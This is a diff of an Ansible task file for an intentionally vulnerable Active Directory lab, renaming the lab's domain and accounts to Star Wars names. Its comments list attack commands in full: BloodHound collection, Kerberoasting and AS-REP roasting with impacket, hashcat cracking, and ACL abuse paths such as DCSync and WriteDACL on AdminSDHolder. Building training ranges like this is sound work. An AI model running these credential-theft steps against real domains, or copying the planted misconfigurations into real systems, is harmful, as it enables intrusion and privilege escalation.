@@ -1,7 +1,7 @@
 ---
 # ==============================================================================
 # vuln_rec_enum/tasks/enum.yml
-# Target: dc01.corp.local
+# Target: coruscant.empire.local
 #
 # REC-009  BloodHound LDAP paths — ADWS + LDAP accessible, no auth required
 # REC-011  Kerberoastable SPNs visible in LDAP
@@ -27,18 +27,18 @@
         - SMB null sessions (REC-007 — RestrictAnonymous=0)
 
       Collection (from attacker machine on 10.10.0.0/21 subnet):
-        bloodhound-python -u jim.halpert -p Password123! -d corp.local \
+        bloodhound-python -u luke.skywalker -p SithLord123! -d empire.local \
           -dc 10.10.0.10 -c All --zip
 
-        SharpHound.exe -c All --domain corp.local --domaincontroller 10.10.0.10 \
-          --ldapusername jim.halpert --ldappassword Password123!
+        SharpHound.exe -c All --domain empire.local --domaincontroller 10.10.0.10 \
+          --ldapusername luke.skywalker --ldappassword SithLord123!
 
       Output: ZIP file → import into BloodHound GUI for attack path visualization.
 
       Common paths in this lab:
-        - jim.halpert → HelpDesk → ForceChangePassword → IT_Team members
-        - svc_darryl → DCSync rights (DF-013/CRED-013)
-        - HelpDesk → WriteSPN on svc_darryl2 → Kerberoasting
+        - luke.skywalker → HelpDesk → ForceChangePassword → IT_Team members
+        - svc_bobafett → DCSync rights (DF-013/CRED-013)
+        - HelpDesk → WriteSPN on svc_bobafett2 → Kerberoasting
 
 # REC-011 / REC-013: Verify Kerberoastable SPNs exist and are LDAP-discoverable
 - name: REC-011 - Check Kerberoastable accounts in LDAP
@@ -67,13 +67,13 @@
         (&(objectClass=user)(ServicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))
 
       Lab accounts with SPNs:
-        - svc_web (HTTP/web01.corp.local — set by vuln_kerberos)
-        - svc_sql (MSSQLSvc/sql01.corp.local — set by vuln_kerberos)
-        - svc_darryl2 (added SPN via LAT-025 — vuln_lat_ext)
-        - jim.halpert (HTTP/jim.halpert-web.corp.local:8080 — LAT-025)
+        - svc_c3po (HTTP/web01.empire.local — set by vuln_kerberos)
+        - svc_sql (MSSQLSvc/kamino.empire.local — set by vuln_kerberos)
+        - svc_bobafett2 (added SPN via LAT-025 — vuln_lat_ext)
+        - luke.skywalker (HTTP/luke.skywalker-web.empire.local:8080 — LAT-025)
 
       Attack:
-        impacket-GetUserSPNs -request corp.local/jim.halpert:Password123! -dc-ip 10.10.0.10
+        impacket-GetUserSPNs -request empire.local/luke.skywalker:SithLord123! -dc-ip 10.10.0.10
         hashcat -m 13100 hashes.txt rockyou.txt
 
 # REC-012: AS-REP roastable users — verify DoNotRequirePreAuth accounts exist
@@ -103,8 +103,8 @@
         (&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
 
       Attack:
-        impacket-GetNPUsers corp.local/ -dc-ip 10.10.0.10 -no-pass -usersfile users.txt
-        impacket-GetNPUsers -request -format hashcat corp.local/jim.halpert:Password123! -dc-ip 10.10.0.10
+        impacket-GetNPUsers empire.local/ -dc-ip 10.10.0.10 -no-pass -usersfile users.txt
+        impacket-GetNPUsers -request -format hashcat empire.local/luke.skywalker:SithLord123! -dc-ip 10.10.0.10
         hashcat -m 18200 <hash> rockyou.txt
 
 # REC-014: ACL enumeration via BloodHound / manual LDAP
@@ -119,14 +119,14 @@
 
       Tools:
         BloodHound ACL collection: -c ACL  (included in -c All)
-        BloodyAD: python3 bloodyAD.py --host 10.10.0.10 -d corp.local \
-          -u jim.halpert -p Password123! get writable --filter "jim.halpert"
+        BloodyAD: python3 bloodyAD.py --host 10.10.0.10 -d empire.local \
+          -u luke.skywalker -p SithLord123! get writable --filter "luke.skywalker"
 
       Key ACEs to look for in this lab (set by vuln_ roles):
-        svc_darryl      → DCSync (GetChanges + GetChangesAll on domain NC)
+        svc_bobafett      → DCSync (GetChanges + GetChangesAll on domain NC)
         HelpDesk        → ForceChangePassword on IT_Team members
-        HelpDesk        → WriteProperty (KeyCredentialLink) on ws01$
-        svc_darryl      → WriteDACL on AdminSDHolder
-        svc_darryl      → WriteOwner on finance_sync group
+        HelpDesk        → WriteProperty (KeyCredentialLink) on tatooine$
+        svc_bobafett      → WriteDACL on AdminSDHolder
+        svc_bobafett      → WriteOwner on finance_sync group
         Exchange WP grp → WriteDACL on domain NC
         developer2      → DsAddSidHistory on domain NC
